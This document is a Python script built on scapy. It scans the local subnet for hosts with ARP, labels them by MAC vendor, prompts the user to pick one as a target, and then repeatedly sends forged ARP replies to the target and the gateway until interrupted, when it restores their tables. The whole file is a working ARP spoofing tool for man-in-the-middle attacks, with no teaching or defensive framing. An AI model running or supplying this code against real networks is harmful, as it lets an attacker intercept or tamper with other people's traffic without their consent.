import socket
import scapy.all as scapy
from mac_vendor_lookup import MacLookup
import os
import re
from scapy.all import Ether, ARP, srp, send
import argparse
import time
import sys

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.224.254', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


v = get_ip()
r = (v[:10-len(v)]) + "1/24"
host = (v[:10-len(v)]) + "1"
request = scapy.ARP()
request.pdst = r
broadcast = scapy.Ether()

broadcast.dst = 'ff:ff:ff:ff:ff:ff'

request_broadcast = broadcast / request
clients = scapy.srp(request_broadcast, timeout=1, verbose=1)[0]
print("     IP                MAC                Company: Name")
count = 1

full_results = [re.findall('^[\w\?\.]+|(?<=\s)\([\d\.]+\)|(?<=at\s)[\w\:]+', i) for i in os.popen('arp -a')]
final_results = [dict(zip(['IP', 'LAN_IP', 'MAC_ADDRESS'], i)) for i in full_results]
final_results = [{**i, **{'LAN_IP': i['LAN_IP'][1:-1]}} for i in final_results]

MAC_IP = {}
AMac = []
IP_A_MAC = {}
for i in final_results:
    if i["IP"] != "?":
        MAC_IP[str(i["MAC_ADDRESS"])] = str(i["IP"]).replace(".localdomain", "")
    AMac.append(i["MAC_ADDRESS"])
    IP_A_MAC[i["MAC_ADDRESS"]] = i["LAN_IP"]

LAN_IPs = []
for element in clients:
    mac = str(element[1].hwsrc)
    name = ""
    try:
        AMac.remove(mac)
    except:
        pass
    LAN_IPs.append(element[1].psrc)
    try:
        try:
            name = MAC_IP[mac]
            comp1 = str(MacLookup().lookup(mac))[:-1]
            comp2 = str(MacLookup().lookup(mac))
            print("[" + str(count) + "] " + element[1].psrc + "      " + mac + "      " + comp1 + ": " + name)
        except:
            print("[" + str(count) + "] " + element[1].psrc + "      " + mac + "      " + comp2)

    except:
        try:
            name = MAC_IP[mac]
            print("[" + str(count) + "] " + element[1].psrc + "      " + mac + "      "+name)
        except:
            print("[" + str(count) + "] " + element[1].psrc + "      " + mac + "      UNIDENTIFIED")
    count += 1

print("\nOTHER CONNECTIONS FOUND(SOME OF MAC ADDRESS MAY BE WRONG)")
print("***SOME OF THE LIST MAY REPEAT ITSELF***\n")

for i in AMac:
    name = ""
    LAN_IPs.append(IP_A_MAC[i])
    try:
        try:
            name = MAC_IP[str(i)]
            comp1 = str(MacLookup().lookup(str(i)))[:-1]
            comp2 = str(MacLookup().lookup(str(i)))
            print("[" + str(count) + "] " + IP_A_MAC[i] + "      " + str(i) + "      " + comp1 + ": " + name)
        except:
            print("[" + str(count) + "] " + IP_A_MAC[i] + "      " + str(i) + "      " + comp2)

    except:
        try:
            name = MAC_IP[str(i)]
            print("[" + str(count) + "] " + IP_A_MAC[i] + "      " + str(i) + "      "+name)
        except:
            print("[" + str(count) + "] " + IP_A_MAC[i] + "      " + str(i) + "      UNIDENTIFIED")
    count += 1

del v, r, request, broadcast, request_broadcast, clients, count, full_results, final_results
del MAC_IP, AMac, IP_A_MAC, comp1, comp2, name

print("\n")
while True:
    choose = input("Choose A Number for Spoofing: ")
    try:
        choose = int(choose)
        break
    except:
        choose = input("Choose A Number for Spoofing: ")


while not (choose > 0 and choose <= len(LAN_IPs)):
    choose = int(input("Choose A Valid Number for Spoofing: "))

def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    send(arp_response, verbose=0)
    if verbose:
        self_mac = ARP().hwsrc
        print("Sent to {}".format(target_ip))

def restore(target_ip, host_ip, verbose=True):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
    send(arp_response, verbose=0, count=7)
    if verbose:
        print("Sent to {}".format(target_ip))

choose -= 1
target = LAN_IPs[choose]
verbose = True
print("\n***SPOOFING HAS STARTED***")
print("CTRL+C TO STOP SPOOFING\n")

try:
    while True:
        spoof(target, host, verbose)
        spoof(host, target, verbose)
        time.sleep(0.5)
except KeyboardInterrupt:
    print("SPOOFING STOPPED: Restoring the network")
    restore(target, host)
    restore(host, target)

